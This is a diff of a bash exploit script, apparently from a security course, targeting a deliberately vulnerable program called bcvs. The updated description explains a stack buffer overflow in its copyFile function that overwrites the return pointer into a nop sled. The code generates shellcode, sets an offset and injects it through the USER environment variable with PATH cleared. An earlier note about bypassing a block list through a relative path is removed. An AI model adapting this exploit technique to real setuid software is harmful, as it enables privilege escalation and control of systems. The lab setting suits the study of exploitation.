@@ -1,29 +1,15 @@
 #!/bin/bash
 
 ## -------------------- Description -------------------- ##
-# The bcvs program uses a relative path to check its
-# "block.list". Therefore you can simply execute bcvs
-# from a directory other than its usual but with the
-# same directory layout and you can get around the blocks
-#
-# Right now this sploit is not complete but being able to
-# bypass the block check is a start.
-#
-# Right now I am working on exploiting the strcpy/strcat
-# overflow in the copyFile function.
+# Sploit6 takes advantage of a buffer overflow in the checkout conditional
+# of the copyFile function. This sploit is a standard buffer overflow
+# leading to a control flow hijack. The overwritten return pointer of the
+# copyFile function points back up the stack into the approximate region
+# where the buffer has overflowed and hits a nop sled.
 ## ----------------------------------------------------- ##
 
 EXPLOIT_EXE="./exploit"
-#SPLOIT_DIR="sploit6_dir"
 
-# Setup necessary environment
-
-#rm -rf $SPLIOT_DIR
-#mkdir -p $SPLOIT_DIR
-#cd $SPLOIT_DIR
-#mkdir -p .bcvs
-#touch .bcvs/block.list
-#touch .bcvs/blah
 rm -rf exploit
 rm -rf exploit.c
 rm -rf haxor
@@ -97,7 +83,7 @@ SHELL_CODE=$($EXPLOIT_EXE)
 OFFSET=100
 
 SHELL_CODE=$($EXPLOIT_EXE $OFFSET)
-#/opt/bcvs/bcvs ci "${SHELL_CODE}"
+
 export USER=${SHELL_CODE}
 export PATH=""
 echo ${USER}
